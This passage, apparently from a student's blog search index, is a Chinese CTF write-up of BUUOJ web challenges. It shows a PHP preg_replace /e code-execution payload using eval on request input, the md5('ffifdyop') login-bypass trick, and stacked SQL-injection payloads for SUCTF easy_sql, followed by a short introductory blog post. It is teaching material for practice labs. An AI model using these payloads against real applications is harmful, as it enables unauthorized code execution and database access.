complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是<code>preg</code>任意代码执行的点了，<code>$re</code>和<code>$str</code>这里我们可以自由控制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">?\S*=$&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])&#125;<br><br><span class="hljs-comment">//构造出如下正则表达式（用phpinfo来简化一下）</span><br>preg_replace(<br>  <span class="hljs-string">&#x27;/(\S*)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span><br>    );<br></code></pre></td></tr></table></figure><p>这里具体的匹配原则如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/*</span><br><span class="hljs-comment">正则表达式中的“\\1”实际上指的字符串的第一个匹配部分（放在缓冲区中）</span><br><span class="hljs-comment">&#123;$&#123;phpinfo()&#125;&#125; -&gt; &#123;$&#123;1&#125;&#125; -&gt; strtolower(&quot;\\1&quot;)  -&gt; strtolower(&quot;$&#123;1&#125;&quot;) -&gt; strtolower(null)</span><br><span class="hljs-comment">在这其中解析的过程，我们会先调用phpinfo(),返回1，于是得到$1</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>对于可变变量的理解，附上一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;This is a&quot;</span>;<br>    <span class="hljs-variable">$hello</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$hello</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">output:</span><br><span class="hljs-comment">$&#123;$hello&#125; = $a = This is a</span><br><span class="hljs-comment">*/</span>  <br></code></pre></td></tr></table></figure><p>分享一个大佬的博客：</p><p>https://www.sqlsec.com/2020/07/preg_replace.html#toc-heading-11</p><h2 id="极客-rceme">7、2019极客-RCEME</h2><h2 id="n1book-ssrfphp-url解析漏洞">8、N1BOOK-SSRF（PHP url解析漏洞）</h2><h2 id="suctf-upload-labs2">9、SUCTF-upload labs2</h2><h2 id="bjdctf-easy_md5sql注入md5解析">10、BJDCTF-easy_md5（SQL注入md5解析）</h2><p>这道题一打开，发现啥都没有，抓个包，发现在<code>response</code>的头里有提示。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_12.png" /></p><p>这里的提示的已经非常明显，大致的原理就是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">md5(&#x27;ffifdyop&#x27;) = 276F722736C95D99E921722CF9ED621C<br></code></pre></td></tr></table></figure><p>这里就有一个非常牛逼的骚点，<code>mysql</code>会把这个加密后的<code>md5</code>字符串理解成为16进制字符串</p><p>这样就能查询字符串转化为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;6xxxxx&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这样就成功进去了，后面的<code>md5</code>操作比较常规了，这里就不说了。</p><h2 id="das-x防疫-ezphp">11、DAS X防疫 ezphp（）</h2><h2 id="suctf-easy_sql堆叠注入">12、SUCTF easy_sql（堆叠注入）</h2><p>打开画面我们可以看到</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_0014.jpg" /></p><p>我们fuzz尝试发现，<code>'</code>等都被过滤了，当你输入非零数字字符时，没有回显，可能在后端被过滤了，显然没有bool盲注。</p><p>考虑尝试堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> tables;<br></code></pre></td></tr></table></figure><p>发现返回了结果，得到了表名为<code>Flag</code>，但是<code>from</code>和<code>Flag</code>被屏蔽了。</p><p>于是考虑猜测后端的<code>sql</code>语句，由于返回结果在0和非0数字符存在差异 ，因此猜测存在<code>||</code>运算符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql_s</span> = <span class="hljs-string">&#x27;select &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>].<span class="hljs-string">&quot; || flag from Flag&quot;</span>;<br></code></pre></td></tr></table></figure><p>于是尝试构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">*</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag;<br></code></pre></td></tr></table></figure><p>这样就把全部内容给得到了。</p><p>不过我们依然可以选择堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode <span class="hljs-operator">=</span> pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这样子构造的语句，成功将<code>||</code>转为连接运算符，从而也可以拿到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>buuoj</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello world</title>
    <link href="/2022/01/16/blog0000-hello-world/"/>
    <url>/2022/01/16/blog0000-hello-world/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面的一些话">写在前面的一些话</h2><p>Welcome to my blog!</p><span id="more"></span><p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>]]></content>
    
    
    
    <tags>
      
      <tag>preface</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
